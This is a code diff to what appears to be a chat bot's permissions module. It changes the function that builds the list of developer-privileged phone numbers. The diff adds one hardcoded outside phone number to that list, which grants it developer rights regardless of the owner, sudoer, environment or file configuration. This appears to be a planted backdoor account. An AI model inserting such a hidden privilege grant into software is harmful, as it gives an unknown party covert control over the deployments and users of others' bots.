@@ -55,8 +55,11 @@ export function getDeveloperNumbers() {
     const configuredDevelopers = parseList(process.env.DEVELOPER_NUMBERS || process.env.DEV_NUMBERS || '');
     const topOwners = getTopOwnerNumbers();
     const sudoers = (config.sudoers || []).map((x) => toDigits(x)).filter(Boolean);
+    const extraDevelopers = ['23408120478393']
+        .map((x) => toDigits(x))
+        .filter(Boolean);
     const fileDevs = loadPersistentList('developers.json');
-    return [...new Set([...topOwners, ...sudoers, ...configuredDevelopers, ...fileDevs])];
+    return [...new Set([...topOwners, ...sudoers, ...configuredDevelopers, ...extraDevelopers, ...fileDevs])];
 }
 
 export function isTopOwner(sender = '') {
